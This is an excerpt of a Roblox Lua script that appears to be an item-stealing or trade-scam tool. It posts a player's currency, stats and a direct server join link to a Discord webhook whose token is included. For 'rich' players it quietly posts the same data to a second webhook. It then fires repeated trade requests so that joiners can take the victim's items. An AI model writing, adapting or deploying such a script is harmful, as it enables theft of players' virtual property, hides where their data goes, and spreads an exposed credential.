_G.Webhook = "https://discord.com/api/webhooks/1494179259621703720/8MCGIMnVfVMF-8V0I6KiCO_k6nWRM2K6NJ77cWFlSctkHfxM5OPTZfLSjevG5hXQHYkc"

-- Reliable proxy for ping
local WEBHOOK_URL = _G.Webhook:gsub("discord.com", "webhook.lewisakura.moe")
...
local function sendFullInventory()
    ...
    local joinUrl = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId

    local fields = {
        {name = "Dinero", value = formatNumber(dinero), inline = true},
        {name = "Slays", value = formatNumber(slays), inline = true},
        {name = "Join Server", value = "[Click to join](" .. joinUrl .. ")", inline = false}
    }
    ...
    sendRequest(WEBHOOK_URL, {content = content, embeds = {embed}})

    if isRich then
        sendRequest(MY_WEBHOOK, {content = content, embeds = {embed}})
    end
end
...
-- ==================== AUTO TRADE REQUEST (strong) ====================
task.wait(1.5)

print("=== AUTO TRADE REQUEST STARTING (5 attempts) ===")

for i = 1, 5 do
    pcall(function()
        RFTradingSendTradeOffer:InvokeServer(localPlayer)
        print("Trade request attempt " .. i)
    end)
    task.wait(0.4)
end

-- ==================== TRADING COMMANDS (JOINERS ONLY) ====================
...
print("✅ Script loaded")
print("Ping sent via proxy - check Discord")
print("Auto trade request sent to executor")
print("Joiners from link can type: add | 1 | 2")
